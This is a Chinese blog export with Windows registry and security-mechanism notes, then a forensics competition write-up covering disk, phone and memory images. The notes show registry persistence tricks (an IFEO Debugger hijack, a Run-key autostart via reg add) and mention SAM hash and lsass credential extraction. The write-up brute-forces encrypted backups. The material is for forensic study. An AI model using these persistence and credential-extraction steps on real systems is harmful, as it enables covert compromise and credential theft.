要分析注册表，我们必须理解它的双层结构：物理层和逻辑层\n注册表的配置单元（物理层 - HIVE） 在Windows9x中，注册表文件的数据信息保存在system.dat（系统）和user.dat（用户）中\n但到了WindowsNT，注册表并不是一个单一的大文件，而是由一组名为配置单元 (Hive)的独立文件组成的\n这些是存储在硬盘上的真实文件，在系统运行时被加载到内存中，下面是几个常见的：\nSYSTEM 存储核心的系统硬件配置、服务列表、启动设置\n路径：C:\\Windows\\System32\\config\\SYSTEM\nSOFTWARE 存储操作系统和已安装软件的全局配置信息\n路径：C:\\Windows\\System32\\config\\SOFTWARE\nSAM 安全帐户管理器(Security Account Manager)，存储本地用户的账户信息和密码哈希\n路径：C:\\Windows\\System32\\config\\SAM\nSECURITY 存储系统范围内的安全策略和用户权限分配\n路径：C:\\Windows\\System32\\config\\SECURITY\nNTUSER.DAT 每个用户都有一个独立的，存储该用户的个性化设置，如桌面背景、程序历史记录等\n路径：C:\\Users\\\u0026lt;用户名\u0026gt;\\NTUSER.DAT\nUsrClass.dat 同样是每个用户一个，存储文件关联和COM类注册信息\n路径：C:\\Users\\\u0026lt;用户名\u0026gt;\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat\nAmcache.hve 记录了近期在该系统上运行过的应用程序及其路径、安装时间等信息\n路径：C:\\Windows\\appcompat\\Programs\\Amcache.hve\nBCD 存储了系统的启动菜单和配置信息，决定了计算机如何启动操作系统\n没有扩展名，文件名就是BCD，即Boot Configuration Data\n路径：通常位于系统启动分区，例如 \\Boot\\BCD\n注册表的根键（逻辑层 - HKEY） regedit.exe的HKEY_...开头的顶级文件夹，是操作系统为了方便管理而创建的逻辑视图，被称为根键\n这些根键将不同的Hive文件组合在一起，形成树状结构\n每一个根键都是一个项（文件夹），下面有着各种项，项里又定义着各种键值对（内容）\n注册表包括以下五个根键，其中只有HKLM和HKU是真实映射Hive的，其余都是它们的视图：\n1. HKEY_CLASSES_ROOT（HKCR） 它负责管理文件的类型关联（决定双击文件用什么程序打开）和 COM 组件的注册信息\n它是虚拟的、合并而成的视图，由HKLM\\SOFTWARE\\Classes和HKCU\\Software\\Classes这两个键合并而成\n2. HKEY_CURRENT_USER（HKCU） 该根键包括当前登录用户的配置信息，包括环境变量，个人程序以及桌面设置等\n它实际上是指向HKEY_USERS下当前用户SID的一个快捷方式，其内容来自当前用户的NTUSER.DAT文件\n3. HKEY_LOCAL_MACHINE（HKLM） 该根键包括本地计算机的系统信息，包括硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息\n它主要映射了SYSTEM，SOFTWARE，SAM，SECURITY等Hive\n4. HKEY_USERS（HKU） 该根键包括计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问，告诉系统当前用户使用的图标，激活的程序组，开始菜单的内容以及颜色，字体\n它的每个子项是一个用户的SID，此外还有.DEFAULT子项，是系统为新用户创建账户时的配置模板\n5. HKEY_CURRENT_CONFIG（HKCC） 该根键包括当前硬件的配置信息，其内容**完全指向（或映射自）**以下这个更深的注册表路径：\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Hardware Profiles\\Current\n常用注册表项 持久化机制 这是恶意软件实现开机自启、确保自身不被清除最常用的位置\n开机自启（Run/RunOnce） 路径： HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run (对所有用户生效) HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (只对当前用户生效) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run (策略控制的启动项) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run 功能：最经典、最直接的自启动位置写入这里的程序会在用户登录或系统启动时自动执行。 关注点：检查所有这些Run键下是否有指向非标准目录（如Temp、AppData）的可执行文件，或者是否有名字可疑的启动项 系统服务（Services） 路径：HKLM\\SYSTEM\\CurrentControlSet\\Services\\ 功能：将程序注册为系统服务，可以在后台运行，权限高，更隐蔽 关注点： 可疑服务名：是否有随机、无意义或拼写错误的服务名称 ImagePath：正常服务（如svchost）的ImagePath是否被篡改为指向恶意程序 FailureCommand：检查服务失败后执行的命令是否被设置为恶意程序 登录辅助程序（Winlogon） 路径：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 功能：Winlogon.exe是负责用户登录的核心进程 关注点: Userinit：默认值应为C:\\Windows\\system32\\userinit.exe,。检查末尾是否有逗号，以及后面是否跟了其他恶意程序的路径（用逗号分隔） Shell：默认值应为explorer.exe，如果被修改，意味着用户的整个桌面环境都被替换了 调试器（Image File Execution Options，IFEO） 路径：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\n功能：用于在程序启动时附加调试器\n关注点：攻击者会创建一个以正常程序命名（如notepad.exe）的子项，然后在其中添加一个名为Debugger的键值，指向自己的恶意程序：\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe] \u0026#34;Debugger\u0026#34;=\u0026#34;C:\\\\Path\\\\To\\\\EvilDebugger.exe\u0026#34; 这样，每当用户尝试运行记事本时，系统会优先运行那个恶意的调试器，而真正的记事本根本不会启动\n也可以用于阻止程序运行，如果调试器不存在，系统找不到指定的.exe，程序就无法启动\n图像环境DLL（AppInit_DLL） 路径：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows 功能：允许将一个或多个DLL注入到几乎所有加载了user32.dll的进程中 关注点：检查**AppInit_DLLs**这个键值是否为空，任何被列在这里的DLL都会被广泛注入，是恶意软件实现全局监控的常用手段 COM组件（CLSID） 路径：HKCR\\CLSID\\ 功能：存储系统中所有COM组件类ID（CLSID）的信息 关注点：检查InprocServer32等子项的默认值，看其指向的 DLL 路径是否可疑 用户账户与凭证 本地用户信息（SAM） 路径：HKLM\\SAM\\SAM\\Domains\\Account\\Users\n功能：存储本地用户的账户名、SID、以及最重要的密码哈希\n关注点：SAM受到严格保护，无法直接读取，但可以通过内存取证工具（如 hashdump）或离线分析SAM和SYSTEM文件来提取密码哈希\n检查Names子键可以发现所有本地账户，包括可能被隐藏的账户\n用户配置文件列表（ProfileList） 路径：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList 功能：记录了本机上所有用户账户的 SID 以及其个人文件夹（Profile）的路径。 关注点：这是将SID和用户名对应起来的关键，可以发现系统上曾经存在过但已被删除的用户账户痕迹 用户活动痕迹 程序执行历史（UserAssist） 路径：HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist 功能：记录用户通过图形界面（点击图标）运行程序的历史，包括运行次数和最后运行时间 取证关注点：还原用户操作的关键，可以清晰地看到用户在特定时间点运行了哪些程序 最近打开的文档（RecentDocs） 路径：HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs 功能：记录用户最近打开过的文档和访问过的文件夹 关注点：了解用户最近处理了哪些文件，可能会发现恶意文档（如带宏的Word）或攻击者留下的工具 文件夹打开记录（BagMRU） 路径： HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU（新版本，主要使用） HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU （旧版本，不太使用） 功能：记录用户曾经打开过的所有文件夹，每一项代表一个用户访问过的文件夹，每个键的值（如 REG_BINARY数据）是一个内部结构（MRU记录+路径+配置引用），其中包含路径信息，但不是直接可见的字符串 关注点：它可以揭示出用户曾经访问过但现在可能已不存在的文件夹，包括网络共享、移动设备上的文件夹，同级目录下的Bags会记录文件夹的具体视图设置 USB设备使用历史（USBSTOR） 路径：HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR 功能：记录所有曾接入本机的U盘、移动硬盘等USB存储设备的厂商、型号和唯一的序列号 关注点：可以确定是否有未经授权的U盘接入，并可将特定U盘与数据泄露或恶意软件植入事件关联起来 系统与网络信息 网络接口与历史IP (Interfaces) 路径：HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\ 功能：记录本机所有网络接口（有线网卡、无线网卡）的配置信息，包括历史上曾经获取过的IP地址、子网掩码、网关和DNS服务器 关注点：可以确定机器在不同时间点的网络环境，对于追踪内网漫游或确认C2连接时的源IP地址至关重要 最后关机时间 (ShutdownTime) 路径：HKLM\\SYSTEM\\CurrentControlSet\\Control\\Windows\\ShutdownTime 功能：记录了系统最后一次正常关机的时间 关注点：帮助确定系统事件发生的时间窗口 时区信息 (TimeZoneInformation) 路径：HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation 功能：记录本机配置的时区 关注点：时间线分析的基准，所有从日志和文件系统中提取的时间戳都必须根据这个时区进行校正，才能得到准确的绝对时间 使用命令行编辑注册表 reg命令的基本结构 reg \u0026lt;操作\u0026gt; \u0026lt;注册表项路径\u0026gt; [参数] 增/改(add) 添加新项（文件夹）\n在Run键下创建一个名为MyApp的新项：\nreg add \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyApp\u0026#34; 添加/设置键值（内容）\n/v：指定键值名\n/t：指定类型\n类型 全称 存储内容 REG_SZ 字符串值 人类可读的文本，如路径、名称、描述 REG_DWORD 32位数值 一个整数，通常用作是/否的标志或简单数字配置 REG_BINARY 二进制值 任意的、非结构化的原始字节数据 /d：指定数据\n/f：如果键值已存在，强制覆盖而不提示\n在Run键下创建一个名为Pentestlab的自启动程序：\nreg add \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; /v Pentestlab /t REG_SZ /d \u0026#34;C:\\tools\\pentestlab.exe\u0026#34; 删 (delete) 删除键值\n/v：指定要删除的键值名 /f：强制删除，不进行确认提示 删除刚才创建的Pentestlab启动项：\nreg delete \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; /v Pentestlab /f 删除整个项（及其所有子项和键值）\n删除刚才创建的MyApp项：\nreg delete \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyApp\u0026#34; /f 查 (query) 查询项下的所有内容\nreg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; 这条命令会列出Winlogon这个项下所有的子项和键值\n查询一个具体的键值\n/v：指定要查询的键值名 reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; /v Userinit 递归查询所有子项和键值\n/s：递归查询所有子项和键值 reg query \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\u0026#34; /s Windows安全机制 安全主体与身份验证 在介绍Windows安全机制之前，我们必须先理解两个基本概念：安全主体和身份验证\n安全主体 安全主体是指在Windows操作系统中能够被识别和进行身份验证的任何实体\n它不仅包括人类用户，还包括以下内容：\n用户账户：包括本地用户（如Administrator）和域用户（如CONTOSO\\jdoe） 计算机账户：加入域的计算机，如WORKSTATION-01$ 安全组：如Administrators组、Everyone组等 系统内置账户：例如SYSTEM、Local Service、Network Service 进程或线程：在特定安全上下文中运行的进程或线程 简单来说，任何需要被系统识别以授予权限的对象，都是一个安全主体\n完整性级别 完整性级别是安全主体的一个属性，用于防止低权限程序访问高权限资源\n主要级别有：\n低完整性级别（如Internet Explorer保护模式） 中等完整性级别（普通用户程序） 高完整性级别（管理员权限进程） 系统完整性级别（操作系统核心进程） 完整性级别形成了额外的访问限制层\n身份验证 身份验证是核实安全主体是否确实是其所声称身份的过程，主要回答“你是谁？”这个问题\n身份验证确保访问者不是冒名顶替者，常见方式包括密码核对、智能卡认证、生物识别等\n需要注意的是，身份验证与授权是不同的概念，身份验证是授权的前提，但本身不等同于授权\nSID 什么是SID SID全称Security Identifier，即安全标识符，就是操作系统为每一个安全主体分配的、一个全局唯一且不可变的号码\n唯一性：一个 SID 只会分配给一个安全主体，即使这个账户被删除，它的 SID 也不会被重新分配给新账户 不变性：账户可以改名，但它的 SID 永远不变 内部标识：用户习惯使用用户名来识别账户，但Windows内核只认SID SID如何工作 SID是Windows安全模型的核心\n创建与存储：当一个账户或组被创建时，本地安全机构（LSA）或域控制器会为其生成一个唯一的 SID，并将其存储在安全数据库中（本地账户存在注册表的SAMHive中，域账户存在活动目录中）\n生成访问令牌：当一个用户成功登录时，系统会为其创建一个访问令牌 (Access Token)，这个令牌就像一张临时通行证，里面包含了该用户的SID、该用户所属所有组的SID、以及该用户拥有的所有特权\n访问控制：当该用户尝试访问一个资源（如文件或文件夹）时，系统会拿出用户的访问令牌，将其中的SID列表与资源的访问控制列表（ACL）进行比对，以决定是否授予访问权限\nSID的结构 一个典型的、完整的 SID 结构如下：\nS - 修订级别 - 颁发机构 - 域标识符 - 相对ID(RID) 我们以一个例子来分解： S-1-5-21-2127521184-1604012920-1887927527-500\nS：固定前缀\n表明这是一个SID\n1：修订级别\n目前所有SID的版本都是1\n5：标识符颁发机构\n这里的5代表 NT Authority，即由WindowsNT系统安全机构颁发，这是最常见的一种\n21-2127521184-1604012920-1887927527：域或本地计算机标识符\n这是一串唯一的数字，代表创建这个SID的计算机或域，同一台电脑上的所有本地账户都会共享这一串数字\n500：相对ID (RID)\n这是 SID 的最后一部分，它在上述域标识符范围内是唯一的，真正用来区分不同的账户\nWindows 为一些内置账户预留了固定的 RID：\n500：Administrator（内置管理员账户） 501：Guest（来宾账户） 普通用户通常从 1000 或 1001 开始递增 众所周知的SID 除了上述每个账户独有的SID，Windows还预定义了一些特殊的、固定的 SID\n它们在所有Windows系统上都具有相同的值和含义，代表了一些内置的身份或通用组\nSID 通用名称 说明 S-1-5-18 Local System 本地系统账户，Windows系统中的最高权限 S-1-5-32-544 Administrators 本地管理员组，属于这个组的成员都拥有管理员权限 S-1-1-0 Everyone 所有用户组，范围最广，包括已登录的用户和匿名用户 S-1-5-11 Authenticated Users 已认证用户组，代表所有通过了身份验证的账户 S-1-5-2 Network 任何通过网络登录的用户 S-1-5-6 Service 任何以服务身份登录的实体 S-1-5-7 Interactive 任何通过直接在本地登录的用户 LSA 什么是LSA LSA，全称本地安全机构 (Local Security Authority)\n它是一个受保护的Windows子系统，核心职责是在单台计算机上强制执行系统的安全策略\n它是Windows 安全模型的中心，负责验证用户身份、管理用户权限并生成安全审计日志\nLSA的用户模式组件体现在一个名为lsass.exe的关键系统进程中，是维持操作系统安全运行的必要进程，任何对lsass.exe的终止都会导致系统在短时间内强制关机并提示安全错误\n访问令牌 访问令牌Access Token是由LSA创建的内核管理对象，描述进程或线程的安全上下文\n包含的内容 用户SID：标明主体身份\n组SID列表：确定主体所属的所有安全组\n特权列表：决定主体可执行的系统级特殊操作，如SeDebugPrivilege\n工作流程 当用户登录后，启动的每个进程都会继承该用户访问令牌的副本\n当进程尝试访问受保护资源时，内核的安全引用监视器（Security Reference Monitor，SRM）会取出进程访问令牌中的SID列表，与资源的访问控制列表（Access Control List，ACL）比较，决定是否允许或拒绝访问\n用户账户控制 用户账户控制（User Account Control，UAC）是基于访问令牌的“双令牌”机制\n传统的Windows系统中，用户经常以管理员权限登录，这导致所有程序默认拥有高权限，增加了系统被攻击和破坏的风险\n而UAC通过限制默认权限，减少系统受攻击面\n当管理员账户登录系统时，系统为其创建两个访问令牌：\n标准访问令牌（受限令牌）：用于默认运行的应用程序，权限受限，防止程序执行高风险操作 完整访问令牌（管理员令牌）：包含完整管理员权限，但只在用户明确授权时使用 普通用户账户只拥有标准令牌，无法提升权限\n当用户启动需要管理员权限的程序或操作（比如安装软件）时，系统会弹出UAC提示，要求用户确认操作：\n管理员账户：弹出提示框，用户确认后程序使用完整访问令牌运行 标准账户：需要输入管理员账户的用户名和密码以获得权限提升 这保证了系统操作必须经过用户授权，避免恶意软件自动提升权限\nLSA的功能 用户认证 LSA是所有用户登录请求的最终处理者\n无论是本地登录还是通过网络的域登录，凭证信息最终都会被传递给LSA进行验证\n访问令牌生成 在用户身份验证成功后，LSA负责创建该用户的访问令牌 (_TOKEN结构)\n该令牌是一个内核对象，它详细描述了用户的安全上下文，包括用户SID、所属组的SID列表、特权列表以及会话信息\n安全策略管理 LSA强制执行在本地安全策略 (secpol.msc) 中定义的规则\n例如密码复杂度策略、账户锁定策略以及用户权限分配\n凭证缓存与管理 为了支持网络认证（如NTLM）和单点登录（SSO），lsass.exe进程的内存中会缓存多种形式的凭证数据\n包括 NTLM 哈希、Kerberos 票据，以及在某些配置下（如开启WDigest认证）的可逆加密或明文形式的密码\n安全审计 根据系统中配置的审计策略，LSA会生成安全事件日志（如登录成功/失败、对象访问等）\n它会将这些日志发送给事件日志服务（Event Log service）进行记录\nLSA认证流程 以一个典型的本地交互式登录为例，LSA 在其中的工作流程如下：\n用户在登录界面（由winlogon.exe管理）输入用户名和密码\nwinlogon.exe 将这些凭证安全地传递给lsass.exe进程\nlsass.exe接收到凭证后，调用相应的认证包，对于本地登录，通常是msv1_0.dll\nmsv1_0.dll与安全帐户管理器(Security Account Manager, SAM)服务通信，请求验证密码\nSAM服务会比对提交的密码哈希与存储在SAM注册表配置单元中的哈希是否一致\n验证成功后，LSA会创建一个包含该用户所有安全信息的访问令牌\nLSA 将此令牌返回给winlogon.exe，winlogon.exe再使用该令牌来启动用户的初始进程（userinit.exe），进而创建桌面环境（explorer.exe）\nLSA的Protection机制 由于lsass.exe内存的敏感性，微软在Windows8.1/Server2012R2及之后版本中引入了LSA Protection机制，其技术名称为受保护的进程之光 (Protected Process Light, PPL)什么鬼名字\n通过在注册表中设置一个特定的键值：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa下的RunAsPPL，让lsass.exe进程可以在启动时被标记为一个受保护的进程\nWindows 内核的内存管理器会阻止任何非受保护的进程（即使是拥有管理员权限的进程）打开lsass.exe 的句柄并请求读取其内存或注入代码\n只有拥有微软特定签名的、同样是受保护的进程（如杀毒软件）才能对其进行访问\n此保护机制仅对活动的操作系统有效，对于通过物理采集或虚拟机快照获得的离线内存镜像进行分析时LSA Protection无效，仍然可以使用Volatility等工具解析lsass.exe的内存\n授权机制 在Windows安全机制中，ACL（Access Control List，访问控制列表） 和 ACE（Access Control Entry，访问控制条目） 是实现授权控制的基础结构，用于定义和限制安全主体对系统对象的访问权限\n访问控制列表 —— ACL ACL 是附加在受保护对象（如文件、进程、注册表键、线程等）上的权限集合，用于控制哪些用户或组能够对该对象执行哪些操作\nACL 分为两种类型：\nDACL 全称Discretionary ACL，自由访问控制列表\n用于指定允许或拒绝某个主体访问对象的权限，是授权控制的核心部分\nSACL 全称System ACL，系统访问控制列表\n用于指定系统是否应审计某个主体对对象的访问（例如记录成功或失败的访问尝试），用于安全审计\n访问控制条目 —— ACE ACL 由一个或多个 ACE 组成，每条 ACE 定义一个安全主体对对象的某种访问规则。ACE 是描述“谁能做什么”的最小授权单元。\n主要组成字段 字段 描述 SID（Security Identifier） 指定该条权限适用的安全主体（用户或用户组） Type（类型） 标识是“允许访问”还是“拒绝访问” Access Mask（访问掩码） 描述具体的权限（如读取、写入、执行、删除等） Flags（标志） 控制是否可继承、是否用于审计等附加属性 常见类型 ACE 类型 描述 ACCESS_ALLOWED_ACE_TYPE 允许某个 SID 执行指定操作 ACCESS_DENIED_ACE_TYPE 拒绝某个 SID 执行指定操作 SYSTEM_AUDIT_ACE_TYPE 审计某个 SID 的访问行为（记录日志） ACE 匹配与权限判断流程 当一个用户（或进程）尝试访问某个对象时，系统会进行如下判断流程：\n获取该用户的访问令牌（包含 SID 和所属组列表） 读取目标对象的 DACL，依序遍历其中的 ACE 将访问令牌中的 SID 与每条 ACE 的 SID 进行比对 遇到匹配的 Deny 类型 ACE → 立即拒绝访问 遇到匹配的 Allow 类型 ACE → 记录允许的操作权限 继续匹配，直到所有 ACE 遍历完成或提前拒绝 如果请求的权限未被任何 ACE 显式允许 → 拒绝访问 注意：ACE 在 DACL 中的顺序非常重要，Deny ACE 一般优先于 Allow ACE\n继承机制与显式权限 ACE 还可以具有继承性：\n显式ACE：直接定义在对象上的权限 继承ACE：从上层容器（如文件夹）继承而来，可自动应用到子对象 继承标志包括： OBJECT_INHERIT_ACE：继承给子对象 CONTAINER_INHERIT_ACE：继承给子容器 INHERIT_ONLY_ACE：仅供继承使用，不适用于当前对象； NO_PROPAGATE_INHERIT_ACE：仅继承一级，不再向下传递 这些继承规则支持管理员一次性配置整个目录或注册表项的权限，提升安全管理效率\n权限掩码常见值 权限 描述 READ 读取对象数据（如文件内容、注册表值） WRITE 修改对象数据 EXECUTE 执行对象 DELETE 删除对象 READ_CONTROL 读取对象的安全描述符（但不包含 DACL） WRITE_DAC 修改对象的 DACL WRITE_OWNER 修改对象的所有者 FULL_CONTROL 拥有全部权限（等价于管理员完全控制） 对象安全描述符 对象的安全信息不仅包括ACL，还包括以下结构，一起被称为安全描述符：\n字段 含义 所有者 对象的拥有者，默认有修改权限 主组 通常在POSIX/UNIX环境兼容性使用 DACL 授权控制 SACL 审计控制 通过GetSecurityInfo、SetSecurityInfo等 API，可以查询或修改对象的安全描述符\n","date":"2025-07-21T12:17:22+08:00","image":"http://picture.928330.xyz/typora/628735","permalink":"https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/","title":"windows相关知识总结（上）"},{"content":"第一次做题，写的比较细比较繁琐\n火眼证据分析 火眼证据分析中新建案件，选择镜像文件检材一，打开就会自动创建分析任务进行分析：\n也可以点击快速分析，选择任务进行分析： 检材1(计算机磁盘镜像) 1.检材一硬盘的 MD5 值为多少 计算哈希，选择md5\n计算过程需要对加密卷解密（文件 -\u0026gt; 右键加密分区 -\u0026gt; 解密），因此最好先把下一问做完再进行计算：\n80518BC0DBF3315F806E9EDF7EE13C12 2.检材一 BitLocker 的恢复密钥是多少 使用EFDD，配合检材三给出的的内存镜像爆破：\n585805-292292-462539-352495-691284-509212-527219-095942 3.检材一镜像中用户最近一次打开的文件名是什么 依次点击：分析 -\u0026gt; 经典视图 -\u0026gt; 查看最后访问时间\n最后一个文件名称为：\n列表.xlsx 4.检材一硬盘系统分区的起始位置 查看系统分区：\n分区4是引导加载程序位置，之后的分区六应该才是主系统分区（硬盘分区），起始位置为：\n649216 5.检材一系统的版本号是多少(格式:x.x.x.x) 分析 -\u0026gt; 基本信息 -\u0026gt; 系统信息：\n这里有两个版本号，组合在一起才是题目要求的格式\n在win10和win11中，第二位数字（次要版本号）固定为0：\n10.0.19042.508 6.检材一回收站中的文件被删除前的路径 分析 -\u0026gt; 基本信息 -\u0026gt; 回收站记录：\nC:/Users/rd/Desktop/iTunes(12.13.0.9).exe 7.检材一给出最后一次修改系统时间前的时间(格式: YYYY-MM-DD HH:MM:SS) 分析 -\u0026gt; 基本信息 -\u0026gt; 系统时间变更 -\u0026gt; 时间变更记录：\n比对各个更改时间的记录的操作时间，找出最晚操作的时间的原系统时间：\n2023-12-12 16:37:12 8.检材一最后一次远程连接本机的时间(格式: YYYY-MM-DD HH:MM:SS） 分析 -\u0026gt; 远程桌面 -\u0026gt; 远程连接过本机的记录：\n查看连接成功记录，比对最晚的连接时间：\n2023-12-11 15:57:02 9.检材一 Chrome 浏览器最后一次搜索过的关键词是什么 分析 -\u0026gt; Chrome浏览器 -\u0026gt; 历史记录 -\u0026gt; 最后访问时间 ：\n从url里面看出搜索内容：\n常见的诈骗话术2023 10.检材一是否连接过 U 盘,如有,请给出 U 盘的 SN 码 分析 -\u0026gt; 基本信息 -\u0026gt; USB最近使用记录 -\u0026gt; 操作时间：\n查看接入过的最后一个设备：\nFC2005927F271 11.检材一 Edge 浏览器最早一次下载过的文件文件名是 分析 -\u0026gt; Edge浏览器 -\u0026gt; 下载记录 -\u0026gt; 结束时间倒序：\n第一个i4tools8不知道为什么没有时间，但详细条目显示时间晚于winrar：\nwinrar-x64-624scp.exe 12.嫌疑人访问的微博的密码的 MD5 值 分析 -\u0026gt; Chrome浏览器 -\u0026gt; 保存的密码：\n微博密码是!dfrDj*\u0026amp;j98_jUe8，计算MD5值：\n5cb42860b3b61ef6dd361ad556f48e05 检材二(iPhone 备份数据) 13.检材二备份的设备名称是什么 分析 -\u0026gt; 基本信息 -\u0026gt; 设备信息：\n\u0026#34;User\u0026#34;的iPhone 14.检材二手机的 iOS 系统版本是多少 同13题图\n17.0 15.检材二备份的时间是多少?(格式: YYYY-MM-DD HH:MM:SS) 同13题图\n2023-12-09 15:02:28 16嫌疑人 iPhone 手机给号码\u0026quot;13502409024\u0026quot;最后一次打电话的时间是(格式: YYYY-MM-DD HH:MM:SS) 当前的备份文件中没有通话记录，其实这个藏在检材一中\n分析 -\u0026gt; 嵌套证据识别 -\u0026gt; IOS备份：\n给出了一个info.plist文件的地址，但他只是配置文件，我们需要回到上层目录，导出完整备份文件：\n同时，我们也能把它添加为新检材，扫描过程中会发现这是加密后的文件，需要密码\n使用Passware Kit Forensic爆破，这里需要爆破的文件是Manifest.plist，从后文（22题）知道是五位数密码\n选择Customize Settings高级设置：\n只保留brute-force，修改成五位数字：\n爆破：\n输入密码后继续分析，分析完成后刷新一下，就会多出新的检材分析结果了\n分析 -\u0026gt; 基本信息 -\u0026gt; 通话记录 -\u0026gt; 时间：\n2023-12-04 13:18:50 17.检材二使用过的号码 ICCID 是多少 同13题图\n89860000191997734908 18.检材二手机中高德地图最后搜索的地址 分析 -\u0026gt; 高德地图 -\u0026gt; 搜索点：\n双山大道3号 19.检材二手机最后一次登陆/注册\u0026quot;HotsCoin\u0026quot;的时间是(格式: YYYY-MM-DDHH:MM:SS) HotsCoin是数字交易平台，从短信中能得到登录时间\n分析 -\u0026gt; 基本信息 -\u0026gt; 短信：\n2023-12-04 13:28:14 20.检材二手机中照片\u0026quot;IMG_0002\u0026quot;的拍摄时间是(格式: YYYY-MM-DD HH:MM:SS) 分析 -\u0026gt; 基本信息 -\u0026gt; 图片 -\u0026gt; IMG_0002：\n2023-12-06 11:08:30 21.检材二中\u0026quot;小西米语音\u0026quot; app 的Bundle ID是什么 Bundle ID是iOS应用唯一标识符，也就是包名\n分析 -\u0026gt; 基本信息 -\u0026gt; 应用列表 -\u0026gt; 搜索小西米语音：\ncom.titashow.tangliao 22.检材二中浏览器最后一次搜索的关键词是什么 浏览器不是uc浏览器，指的是safari\n分析 -\u0026gt; Safari -\u0026gt; 搜索历史：\nios备份密码忘了怎么办 五位纯数字 这里也就是在提示前面的加密备份文件的密码\n23.嫌疑人和洗钱人员约定电子钱包的品牌是什么, 如有多个用顿号分隔 微信聊天记录和信息里都没有相关信息，其他应用里面只有小西米语音有可能了\n分析 -\u0026gt; 其他应用 -\u0026gt; 小西米语音 -\u0026gt; 在线连麦平台 -\u0026gt; 文件分类 -\u0026gt; SQLite 文件\n其他应用是耗时分析，火眼不会自动分析，需要手动进行选择分析\n本来应该是有im5db这个数据库的，我的分析结果里面没有，其他六个都有，也许是因为后缀的原因？\n所以直接沿着下面这个路径找了：\n/Documents/IM5_CN/9031bc3c805ac5e55ecaa151092c2c4b/IM5_storage/1399634813467579522/im5db\n查看message表的content字段：\nimToken、Bitcoin 24.嫌疑人和洗钱人员约定电子钱包的金额比例是什么 同上题图：\n0.2 检材三(计算机内存镜像) 25.检材三中进程\u0026quot;FTK Imager.exe\u0026quot;的 PID 是多少 不知道为什么我的volatility2不能分析出win10的结果，只好使用volatility3：\npython3 vol.py -f ../memdump2023.raw windows.pslist.PsList | grep FTK 11328 26.检材三中显示的系统时间是多少?(格式: YYYY-MM-DD HH:MM:SS) python3 vol.py -f ../memdump2023.raw windows.info.Info 2023-12-12 04:06:25 27.检材三中记录的当前系统ip是多少? python3 vol.py -f ../memdump2023.raw windows.netscan.NetScan 172.18.7.229 检材四 (红米手机备份数据) 28.检材四中迅雷下载过的文件名是什么? 分析 -\u0026gt; 迅雷 -\u0026gt; 云盘 -\u0026gt; 离线下载目录：\n《向银河靠近》.txt 29.检材四中安装了哪些可是实现翻墙(VPN)功能的 app? 没啥说的： clash 30.检材四备份的设备系统版本是多少? 分析 -\u0026gt; 基本信息-\u0026gt; 设备信息 -\u0026gt; 厂商版本：\nV14.0.2.0.TKSCNXM 31.检材四备份的时间是多少(答案以 13 位时间戳表示) 同上题图，转换时间戳（2023-12-13 17:20:32）：\n1702459232429 32.检材四中 FileCompress app 包名是什么? 包名就在检材里面列出，复制黏贴就行：\ncom.zs.filecompress 33.检材四中备忘录记录的内容是什么? 分析 -\u0026gt; 基本信息-\u0026gt; 便签：\nVcpswd:edgewallet 34.请列出检材四中所有虚拟币钱包 app 的包名, 如有多个用顿号分隔 直接搜索检材里的app，一共六个： de.schildbach.wallet、com.bitcoin.mwallet、 piuk.blockchain.android、im.token.app、com.paxful.wallet、pro.huobi 35.检材四中嫌疑人使用 Bitcoin Wallet 钱包地址是什么? 在下面路径中找到并导出日志文件：\nBitcoin Wallet(de.schildbach.wallet).bak/apps/de.schildbach.wallet/f/log/wallet.log 搜索walletaddress：\nbc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt 36.MD5 值为\u0026quot;FF3DABD0A610230C2486BFFBE15E5DFF\u0026quot;的文件在检材四中的位置 这一题据说是结合前面提到的FileCompress一路找下去就能发现，不过太电波了：\n这里更好的办法是用HashMyFiles，全部算一遍再搜索\n然而我不知道怎么使用这个工具，好在火眼有类似的功能\n文件 -\u0026gt; 检材四 -\u0026gt; 文件系统 -\u0026gt; 勾选所有文件 -\u0026gt; 右键新建哈希集 -\u0026gt; 